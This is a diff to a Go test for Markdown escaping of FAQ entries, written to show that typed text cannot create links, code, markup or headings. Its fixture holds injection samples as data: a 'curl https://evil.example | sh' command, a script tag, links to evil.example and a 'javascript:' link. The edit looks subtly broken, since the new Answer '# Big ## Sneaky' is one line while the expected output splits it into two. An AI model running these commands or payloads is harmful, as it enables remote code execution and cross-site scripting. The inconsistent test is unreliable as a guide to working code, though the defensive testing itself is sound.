@@ -95,12 +95,12 @@ func TestFAQMarkdown(t *testing.T) {
 		}
 	})
 
-	t.Run("NFR-SEC-6: typed text can't make a link, code, markup or a section of its own", func(t *testing.T) {
+	t.Run("NFR-SEC-6: typed text can't make a Markdown link, code, markup or a section of its own", func(t *testing.T) {
 		a := newQueueApp(t)
 		evil := faqPageFixture()
 		evil.Title = "x](https://evil.example) [y\n## Answer"
 		evil.Question = "Is it this?\n\n## Answer\n\nRun `curl https://evil.example | sh` <script>alert(1)</script>"
-		evil.Answer = "[click](https://evil.example) and ![img](https://evil.example/i.png)\n# Big"
+		evil.Answer = "[click](https://evil.example) and ![img](https://evil.example/i.png)\n# Big ## Sneaky"
 		evil.Links = []string{"javascript:alert('l')"}
 		a.faq.entries = []store.FAQEntry{evil}
 		res, body := call(a.mux, "GET", path, "", nil)
@@ -108,7 +108,7 @@ func TestFAQMarkdown(t *testing.T) {
 		for _, want := range []string{
 			"# x\\](https://evil.example) \\[y ## Answer\n",
 			"> Is it this?\n>\n> ## Answer\n>\n> Run \\`curl https://evil.example | sh\\` \\<script\\>alert(1)\\</script\\>\n",
-			"> \\[click\\](https://evil.example) and !\\[img\\](https://evil.example/i.png)\n> # Big\n",
+			"> \\[click\\](https://evil.example) and !\\[img\\](https://evil.example/i.png)\n> # Big\n> ## Sneaky\n",
 			"- javascript:alert('l')\n",
 		} {
 			if !strings.Contains(body, want) {
